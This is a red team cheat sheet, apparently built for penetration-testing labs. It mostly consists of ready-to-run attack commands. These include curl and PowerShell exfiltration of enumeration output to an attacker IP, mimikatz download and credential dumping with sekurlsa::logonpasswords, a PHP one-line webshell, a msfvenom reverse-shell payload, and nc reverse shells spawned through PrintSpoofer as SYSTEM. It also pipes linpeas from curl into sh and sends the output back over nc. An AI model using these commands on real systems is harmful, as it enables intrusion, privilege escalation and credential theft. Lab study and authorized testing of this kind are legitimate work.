# Red Team Cheat Sheet

# Web

https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content

Commonly Used Dictionaries

```
# web/common.txt - 4743 Lines
https://raw.githubusercontent.com/voidexec/sec/main/web/common.txt

# web/big.txt - 20476 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/big.txt

# web/directory-list-2.3-small.txt - 87664 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-small.txt

# web/directory-list-2.3-medium.txt - 220559 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-medium.txt

# web/directory-list-2.3-big.txt - 1273832 lines
https://raw.githubusercontent.com/voidexec/sec/main/web/directory-list-2.3-big.txt
```

HTTP Server for Upload and Download

```bash
# Download
https://raw.githubusercontent.com/voidexec/sec/main/web/httpserver.py

# Start Server
python3 httpserver.py (default port 80)
python3 httpserver.py -p 8000
```

Upload and Download with Curl

```bash
# Upload file with curl
curl -F 'file=@/home/ubuntu/Desktop/linpeas.out' http://192.168.45.145/

# Download file with curl
curl -O http://192.168.45.145/linpeas.sh
```

Upload and Download with PowerShell

```powershell
# Upload with PowerShell
Add-Type -AssemblyName System.Net.Http; $client = New-Object System.Net.Http.HttpClient; $fs = [System.IO.File]::OpenRead("C:\Users\Public\winpeas.out"); $content = New-Object System.Net.Http.MultipartFormDataContent; $fileContent = New-Object System.Net.Http.StreamContent($fs); $fileContent.Headers.ContentDisposition = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue("form-data"); $fileContent.Headers.ContentDisposition.Name = '"file"'; $fileContent.Headers.ContentDisposition.FileName = '"test.out"'; $content.Add($fileContent); $client.PostAsync("http://192.168.45.145/", $content).Wait(); $client.Dispose()

# Download with PowerShell
iwr -uri "http://192.168.45.145/mimikatz.exe" -outfile "C:\Users\Public\mimikatz.exe"
```

# Reverse Shell

Reverse Shell Generator https://www.revshells.com/

```bash
# PHP One-liner webshell
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

```powershell
# Windows Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.199 LPORT=9002 -f exe -o reverse.exe
```

# Windows

Quick Commands

```powershell
# Run as another user (Launch new window)
runas /user:backupadmin cmd
# Search for Flag
Get-ChildItem -Path C:\Users -Include local.txt,proof.txt,user.txt,root.txt,flag.txt -File -Recurse -ErrorAction SilentlyContinue
```

PrintSpoofer (Abusing `SeImpersonatePrivilege`)

https://github.com/itm4n/PrintSpoofer

```powershell
https://github.com/itm4n/PrintSpoofer/releases
# Usage 1 - Spawning cmd interactive as system
PrintSpoofer64.exe -i -c cmd
# Usage 2 - Launching reverse shell as system
PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
```

NC

https://github.com/int0x33/nc.exe/

```powershell
https://github.com/int0x33/nc.exe/
# nc64.exe
https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
# Reverse shell
nc64.exe 192.168.45.145 9001 -e powershell
```

Mimikatz

https://github.com/ParrotSec/mimikatz

```powershell
https://raw.githubusercontent.com/ParrotSec/mimikatz/refs/heads/master/x64/mimikatz.exe
# Usage
privilege::debug
sekurlsa::logonpasswords full
```

# Linux

Linpeas

```powershell
https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out # attacker
curl http://192.168.45.145/linpeas.sh | sh | nc 192.168.45.145 9002 # victim
```

# Services

FTP

```bash
# Download all the files
ftp 192.168.119.2
mget *
```
